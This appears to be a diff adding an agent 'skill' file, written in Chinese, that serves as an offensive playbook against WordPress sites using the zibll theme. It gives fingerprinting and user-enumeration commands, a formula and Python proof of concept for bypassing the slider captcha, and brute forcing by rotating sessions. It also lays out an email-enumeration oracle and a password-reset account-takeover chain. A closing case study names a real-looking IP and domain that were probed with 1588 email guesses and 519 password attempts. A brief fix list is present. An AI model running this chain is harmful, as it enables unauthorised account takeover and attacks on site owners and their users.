@@ -1,0 +1,224 @@
+---
+name: zibll-captcha-bypass-account-chain
+description: Use when a WordPress site runs the zibll theme.
+---
+
+# zibll 子比主题 验证码绕过与账户安全链
+
+**触发：** 目标是 WordPress + `zibll` 主题（`/wp-content/themes/zibll/` 指纹、`/user-sign?tab=signin` 自定义登录页）。
+**价值：** 一条从匿名到「任意用户密码重置 + 自动登录」的链，卡点在管理员邮箱与 6 位邮箱码。
+
+---
+
+## 0. 快速指纹
+
+```bash
+# 主题指纹
+curl -s https://TARGET/wp-content/themes/zibll/style.css | head -20
+# 自定义登录页
+curl -s "https://TARGET/user-sign?tab=signin"
+# action 目录可直读并泄露绝对路径（WP 根）
+curl -s https://TARGET/wp-content/themes/zibll/action/user.php
+#  -> Fatal error: ... in /www/wwwroot/SITE/wp-content/themes/zibll/action/user.php on line N
+# 完整站点配置（278KB）
+curl -s https://TARGET/wp-json/ | jq '.namespaces'
+# 入口一个用户就够（枚举管理员）
+curl -s https://TARGET/wp-json/wp/v2/users
+```
+
+**关键：前端首页 JS 里会 dump `upload_ext`（站点允许的全部上传扩展名）——用它判断能不能上传 shell。**
+
+```bash
+curl -s https://TARGET/ | grep -oP "upload_ext\s*:\s*'\K[^']*" | tr '|' '\n'
+```
+
+---
+
+## 1. 核心漏洞：滑块验证码答案由客户端决定
+
+`action/captcha.php`：
+
+```php
+case 'slider':
+    @session_start();
+    $randstr = !empty($_REQUEST['randstr']) ? $_REQUEST['randstr'] : '';
+    $_a = (int) substr($randstr, 0, 2);
+    $_b = (int) substr($randstr, -2);
+    $_x = (int) substr($randstr, $_a + 2, $_b - 2);
+    $_SESSION['machine_slider_x']        = $_x;            // ← 正确答案 = 攻击者给的参数
+    $_SESSION['machine_slider_rand_str'] = md5(time());
+    echo json_encode(['token'=>$token,'rand_str'=>$rand_str,'check'=>md5(date('Y-m-d H:i:s',time())),'time'=>time()]);
+```
+
+`action/function.php` → `zib_ajax_man_machine_verification()` / `zib_slider_captcha_verification()` 用同一 session 值比对：
+
+```php
+if (absint($T_x - $machine_slider_x) > 8) return false;   // T_x 来自 Ticket，我控制
+$R_a=(int)substr($Randstr,0,1); $R_b=(int)substr($Randstr,-2);
+if ($R_a . substr($machine_slider_rand_str,$R_a,$R_b-$R_a) . $R_b !== $Randstr) return false;
+```
+
+### 构造公式（实测 100% 通过）
+
+```python
+# ① 让服务端把答案设成 X（自选数值，建议 120-380）
+a = b = 11
+randstr_param = f"{a:02d}" + rnd(a) + str(X) + rnd(12) + f"{b:02d}"
+#   服务端: _a=11, _b=11, _x=(int)substr(p, 13, 9) = X
+r = GET captcha.php?type=slider&randstr=<randstr_param>
+j = r.json()   # {'token':..., 'rand_str': md5(time()), 'check': md5(datetime), 'time':...}
+
+# ② ticket: <Ta:2位><Ta个随机字符><X><Tb个随机字符><Tb:2位>
+ticket = f"{a:02d}" + rnd(a) + str(X) + rnd(b) + f"{b:02d}"
+#   服务端: T_a=11, T_b=11, T_x=(int)substr(ticket,13,9)=X → |X-X|=0 ≤ 8 ✓
+
+# ③ randstr: <Ra:1位><rand_str[Ra:Ra+(Rb-Ra)]><Rb:2位>
+Ra, Rb = 1, 20
+randstr_submit = f"{Ra}" + j['rand_str'][Ra:Ra+(Rb-Ra)] + f"{Rb:02d}"
+
+# ④ 提交必须是 captcha[] 数组！（缺任一项报「环境异常，请刷新后重新提交」）
+data = {'captcha[ticket]': ticket, 'captcha[randstr]': randstr_submit,
+        'captcha[spliced]': 'true', 'captcha[check]': j['check'], ...}
+```
+
+**常见坑：**
+- 提交**扁平字段**（`ticket=` 而非 `captcha[ticket]=`）→ 恒返回 `环境异常，请刷新后重新提交`
+- 漏 `captcha[check]` → 同上（第 774 行 `empty($check)` 判断）
+- 验证码构造失败 → `环境异常，人机验证失败`（= `zib_slider_captcha_verification` 返回 false）
+- **`captcha.php` 与 admin-ajax 必须同一 PHPSESSID**（PHP session 绑定）；多 PHP-FPM 池环境约 15% 概率抖动 → **加重试即可**
+- `md5(time())` 同秒内多次调用会返回相同 `rand_str`（正常）
+- 中文响应是 `\uXXXX` 转义，**必须 `r.json()` 解码**再判断，别用中文字面量匹配
+
+---
+
+## 2. 可扩展的攻击面（全部验证码保护被击穿）
+
+| action | 用途 |
+|---|---|
+| `user_signin` | 登录 |
+| `user_signup` | 注册 |
+| `resetpassword_captcha` / `reset_password` | 找回密码发码 / 重置 |
+| `signin_captcha` / `signup_captcha` | 发登录/注册码 |
+| `bind_email_captcha` / `user_bind_email` | 改绑邮箱 |
+| `bind_phone_captcha` / `user_bind_phone` | 改绑手机 |
+| `verify_user` | 认证用户 |
+| `user_change_password` | 改密码 |
+| `frontend_links_submit` | 友情链接（**无需登录**） |
+
+**nonce：** `zib_ajax_verify_nonce()` 用 `$_REQUEST['action']` 作为 nonce action → 从页面（`/user-sign?tab=signin`）取 `_wpnonce` 即可；
+`user_signup` / `user_bind_email` / `verify_user` **不校验 nonce**。
+
+---
+
+## 3. 三条高价值链
+
+### 3.1 注册无需邮箱验证 + 注册即登录
+`user_signup_captch` 关闭时整段邮箱码校验被跳过，`wp_create_user()` 后直接 `wp_set_auth_cookie()`。
+```
+POST action=user_signup  name=<2-16字符非纯数字非邮箱>  password2&repassword  email=<任意>
+→ {"error":0,"msg":"注册成功，欢迎您：xxx"}  + Set-Cookie: wordpress_logged_in_*
+```
+用户名禁含保留词（`test`/`admin` 等），长度 2-16。
+
+### 3.2 登录限速按 session 隔离 → 等效无限爆破
+```php
+$count = $_SESSION['zib_check_count_' . $key] ?? 1;   // 计数器在 session 里
+```
+**每个新 PHPSESSID = 5 次干净机会，且口令不依赖 session** → 轮换 session 即可无限次在线口令测试。
+（注意：`zib_captcha` 验证码值也在 session 里 → **找回密码的码无法用同法绕过限速**）
+
+### 3.3 邮箱注册状态枚举 Oracle
+`resetpassword_captcha` / `signin_captcha` / `user_bind_email` / `user_signup(email_exists)`：
+- 已注册 → `验证码已发送至您的邮箱` 或 `60秒后可重新发送`
+- 未注册 → `该邮箱尚未注册或绑定账号`
+（**Oracle 已用自注册账号双向验证，可靠**）
+
+---
+
+## 4. 找回密码 → 账户接管链（核心目标）
+
+`zib_ajax_reset_password()` 顺序：①密码强度 → ②解析邮箱 → ③人机验证(可绕) → ④邮箱验证码 → ⑤`get_user_by('email')` → ⑥`wp_update_user` 改密 → ⑦**`wp_set_auth_cookie()` 自动登录**
+
+```php
+if (!$current_user_id) {
+    wp_set_current_user($user_data->ID, $user_data->user_login);
+    wp_set_auth_cookie($user_data->ID, true);      // ← 改密即接管
+}
+```
+
+**验证码卡点（实测）：**
+- 码 = `zib_get_captcha(6)`，6 位纯数字，30 分钟有效
+- 存 `$_SESSION['zib_captcha']`，与 `$_SESSION['zib_verification_to']`(=邮箱) 同时绑定 → **换 session 无效**
+- 限速 `zib_is_error_frequency_limit('captcha')`：第 6 次报 `错误次数过多，请30秒后再试`；>10 次后 180 秒/次 ⇒ **6 位码不可爆破（单窗口成功概率 ~1.7e-5）**
+- `wp_mail` 通常可用（`验证码已发送至您的邮箱`）⇒ 码真发到目标邮箱，无旁路
+- **⇒ 唯一可行路径是把目标邮箱 + 收到的码拿到手（社工/邮箱侧）**
+
+---
+
+## 5. 文件上传 → RCE（一般为死路，先验证再投入）
+
+**必查：前端 `upload_ext`**（见 §0）。若列表含 `php/phtml/phar/pht/htaccess/user.ini` → 有戏。
+常见站点白名单只含办公/媒体类型（含 `class`/`c`/`h` 也不可执行）。
+
+上传入口（多数需登录 + nonce）：
+`user_upload_file` / `user_upload_image` / `user_set_rewards` / `user_upload_avatar` / `user_upload_cover` /
+`user_split_upload`+`user_split_upload_merge` / `user_auth_apply` / `report_user` /
+bbs `save_plate` / `save_term` / shop `order_comment` / **未登录** `frontend_links_submit`
+
+全部经 `zib_php_upload()` → `media_handle_upload()` → **`wp_check_filetype_and_ext()` 双重校验（扩展名白名单 + finfo 真实 MIME）** → 除非白名单被放宽，否则拿不到 webshell。
+
+**分片上传逻辑缺陷（价值有限）：** `zib_ajax_user_split_upload` 只在 `chunk < 1` 时校验 nonce；分片落盘路径可预测 `{blog_id}-{md5(file_name)}-{chunk}.part`（`file_name` 完全可控但被 md5）→ 合并后仍走 WP MIME 校验。
+
+---
+
+## 6. 其它已确认问题
+
+- `action/{captcha,user,comment,media}.php` 可直读 → PHP Fatal error 泄露 **Web 绝对路径**（宝塔 `/www/wwwroot/<site>/`）
+- `GET /wp-json/` 未授权返回完整站点配置（145 路由、authentication 端点）
+- 图片验证码不可用（`imagettftext` 字体缺失，PHP 警告污染输出）
+- 头像 `avatar_urls` 可能是 64 位 SHA-256（zibll 加密头像）→ **不能反查邮箱**
+
+---
+
+## 7. 快速 PoC 骨架
+
+```python
+import requests, random, re
+CHARS="abcdefghjklmnpqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ1234567980"
+rnd=lambda n: "".join(random.choice(CHARS) for _ in range(n))
+H={"Host":"SITE"}; REF="https://SITE/user-sign?tab=signin"
+s=requests.Session(); s.verify=False
+s.headers.update({"User-Agent":"Mozilla/5.0 Chrome/120"})
+
+def cap(x):
+    a=b=11
+    rs=f"{a:02d}"+rnd(a)+str(x)+rnd(12)+f"{b:02d}"
+    r=s.get(f"https://IP/wp-content/themes/zibll/action/captcha.php",
+            params={"type":"slider","randstr":rs},headers={**H,"Referer":REF},timeout=15)
+    j=r.json(); rr=j["rand_str"]
+    return {"captcha[ticket]":f"{a:02d}"+rnd(a)+str(x)+rnd(b)+f"{b:02d}",
+            "captcha[randstr]":"1"+rr[1:20]+"20","captcha[spliced]":"true",
+            "captcha[check]":j["check"]}
+
+# 关键：中文响应要 json() 解码后再判断，并对「环境异常，人机验证失败」重试 3-4 次
+```
+
+---
+
+## 8. 修复
+
+1. `captcha.php` 不得从请求参数推导 `machine_slider_x`——答案必须**服务端生成**
+2. 验证码状态与限速计数放 **Redis**（IP/账号维度），不要用 PHP session
+3. 找回密码成功后**不要** `wp_set_auth_cookie`
+4. 注册开启邮箱验证（`user_signup_captch`）
+5. 升级 zibll ≥ **V9.1**（2026-09-01）
+6. 禁止直接访问 `action/*.php`，关闭错误回显
+
+---
+
+## 9. 实战案例：23.94.123.180（33uo.com，zibll 9.0）
+
+- 验证码绕过 100% 成立；注册即登录成立；登录限速 session 级成立；Oracle 双向验证可靠
+- 1588 个候选邮箱枚举 **零命中** + 519 个定向口令测试 **零命中** → 管理员邮箱非常规 + 口令强
+- 上传白名单 125 种无 PHP → 未 getshell
+- **结论：链已打通到「只差邮箱+6位码」，未接管。**
